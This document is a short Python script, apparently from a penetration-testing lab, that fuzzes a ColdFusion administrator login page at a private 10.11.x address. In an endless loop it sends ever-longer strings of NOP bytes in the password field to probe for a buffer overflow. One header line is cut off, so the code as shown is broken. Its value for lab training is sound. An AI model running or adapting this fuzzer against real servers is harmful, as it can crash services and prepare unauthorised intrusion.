#!/usr/bin/python
import sys
import http.client
import urllib.parse

buffer = "\x90"*35000
tracker = 35000
counter=1000
#targeturl = sys.argv[0]
while True:

        buffer = buffer + ("\x90"*counter)
        tracker = tracker + counter
        connection = http.client.HTTPConnection("10.11.1.10")
        print ("Sending buffer of " + str(tracker))
        params= urllib.parse.urlencode({"cfadminPassword": ("%s" %(buffer)), "requestedURL": "/CFIDE/administrator/index.cfm", "salt": "1557691591276", "submit": "Login"})
        headers = {"Content-type": "application/x-www-form-urlencoded","Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Referer": "http://10.11.$
        connection.request("POST", "/CFIDE/administrator/enter.cfm?", params, headers)
        response = connection.getresponse()
        status = response.status
        reason = response.reason
        print (str(status)+ " "+ reason)
        connection.close()
